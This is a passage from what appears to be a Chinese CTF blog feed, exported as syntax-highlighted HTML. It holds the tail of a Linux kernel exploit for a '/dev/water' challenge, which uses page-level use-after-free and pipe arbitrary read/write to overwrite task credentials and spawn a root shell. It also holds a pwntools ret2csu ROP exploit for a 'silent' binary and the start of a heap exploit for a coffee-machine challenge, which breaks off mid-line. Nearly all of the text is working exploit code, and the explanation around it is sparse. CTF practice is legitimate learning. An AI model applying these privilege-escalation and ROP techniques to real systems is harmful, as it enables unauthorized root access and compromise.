class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">  page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">privilege_escalation_by_task_overwrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">size_t</span> ptask_page_addr = <span class="built_in">direct_map_addr_to_page_addr</span>(parent_task);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)ptask_page_addr, buf);</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">    <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init_task = parent_task;</span><br><span class="line">  init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">  init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_task_page = <span class="built_in">direct_map_addr_to_page_addr</span>(current_task);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)current_task_page, buf);</span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">  tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">  tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_root_shell</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bind_core</span><span class="params">(<span class="type">int</span> core)</span> </span>&#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CPU_ZERO</span>(&amp;cpu_set);</span><br><span class="line">  <span class="built_in">CPU_SET</span>(core, &amp;cpu_set);</span><br><span class="line">  <span class="built_in">sched_setaffinity</span>(<span class="built_in">getpid</span>(), <span class="built_in">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">bind_core</span>(<span class="number">0</span>);</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">second_page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">construct_self_pipe</span>();</span><br><span class="line">  <span class="built_in">info_leak</span>();</span><br><span class="line">  <span class="built_in">privilege_escalation_by_task_overwrite</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://www.52pojie.cn/thread-1795570-1-1.html">Linux kernel </a></li><li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^ 3CTF2023 d3kcache  - arttnba3s blog</a></li><li><a href="https://blog.xmcve.com/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023-Writeup/#title-8">2023 Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/Ls-PQ3VtVRiKRXwHWTQIwA">DJB2023 WP</a></li><li><a href="https://mp.weixin.qq.com/s/3vaT1gJBagSjovJZNZaR-g">El3ctronic</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/"/>
      <url>/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CTF PWN</p></blockquote><span id="more"></span><p>alarm16alarm <code>isnan</code></p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g &lt;&gt;</span><br></pre></td></tr></table></figure><h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>PIENX</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init_seccomp</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>putswritegotbssret2csu</p><ul><li>gotgadget <code>mov [xxx], xxx</code> </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary silent</span><br><span class="line">0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br></pre></td></tr></table></figure><ol><li>ret2csubssROP chain</li><li>bssROPchain</li></ol><ul><li>magic read_got syscall</li><li>libc_base</li><li>read ROPchianROPchain</li></ul><p></p><ul><li>magic gadgetebxebx<strong>0x100000000</strong></li><li>raxrax</li><li>rsp pop_rsp </li></ul><p>exp</p><ul><li><del></del></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;silent_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400788</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400961</span></span><br><span class="line">ret = <span class="number">0x0000000000400696</span></span><br><span class="line">leave_ret = <span class="number">0x0000000004008FC</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040095d</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt.read</span><br><span class="line">read_got = elf.got.read</span><br><span class="line"></span><br><span class="line">csu_front = <span class="number">0x400940</span></span><br><span class="line">csu_end = <span class="number">0x40095A</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">main_addr = <span class="number">0x0400878</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu:    0, 1, call, rdi, rsi, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:0000000000400940 4C 89 FA                      mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400943 4C 89 F6                      mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400946 44 89 EF                      mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400949</span></span><br><span class="line"><span class="string">.text:000000000040094D 48 83 C3 01                   add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400954 75 EA                         jnz     short loc_400940</span></span><br><span class="line"><span class="string">.text:0000000000400954</span></span><br><span class="line"><span class="string">.text:0000000000400956</span></span><br><span class="line"><span class="string">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34j</span></span><br><span class="line"><span class="string">.text:0000000000400956 48 83 C4 08                   add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040095A 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040095B 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040095C 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040095E 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400960 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400962 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400964 C3                            retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">64</span> + <span class="number">8</span>)</span><br><span class="line">p1 += flat([</span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0x400</span>,</span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">])</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss ROP chain</span></span><br><span class="line"><span class="comment"># bss pop rbp rbp stdout+0x3d</span></span><br><span class="line"><span class="comment"># magic gadget [stdout] </span></span><br><span class="line"><span class="comment"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/2xg &amp;stdout</span></span><br><span class="line"><span class="string">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; p syscall</span></span><br><span class="line"><span class="string">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d1b520 &lt;syscall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10wi 0x7fc4d7d1b520</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">pwndbg&gt; p write</span></span><br><span class="line"><span class="string">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d100f0 &lt;write&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = flat([</span><br><span class="line">    stdout+<span class="number">0x3d</span>,                        <span class="comment"># rbp</span></span><br><span class="line">    csu_end, <span class="number">0x100000000</span>+<span class="number">0x7fc4d7d1b537</span>-<span class="number">0x00007fc4d7fec760</span>, stdout+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    magic,                                                      <span class="comment"># stdout syscall</span></span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x1</span>,                <span class="comment"># rax</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, stdout, <span class="number">1</span>, read_got, <span class="number">8</span>,                 <span class="comment"># syscall (1, 1, read_got, 8)</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x100</span>,         <span class="comment"># ROPchian</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret                                                   <span class="comment"># bss_chain</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">s(p2)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - libc.sym.read</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;bss&quot;</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = bss+<span class="number">0x1000</span></span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx; ret&quot;</span>)).__next__() </span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi; ret&quot;</span>)).__next__() </span><br><span class="line"></span><br><span class="line">rop_chian = flat([</span><br><span class="line">    <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>,  <span class="comment"># 8</span></span><br><span class="line">    pop_rdi_ret, flag_addr, pop_rsi_ret, <span class="number">0</span>, open_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, read_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, write_addr,</span><br><span class="line">    </span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">s(rop_chian)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h2><p>coffee_list: <br>coffee_left user  admin <code>3*7</code> idposition</p><p>user</p><ul><li>idposfree</li><li> coffee_list </li></ul><p>admin</p><ul><li>replenishadmin coffee_list user coffee_left</li><li>change_defaultidposuser coffee_left</li></ul><p> get shell</p><ul><li>admin change_default updatereaduaf</li><li>underflowid, pos 0</li></ul><p>exp</p><ul><li>change_defaultdouble free    replenish admin coffee_left<del></del></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;pwn_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">idx, con = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input the id of what coffee you want to buy&quot;</span>, itob(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Do you want to add something?Y/N&quot;</span>, <span 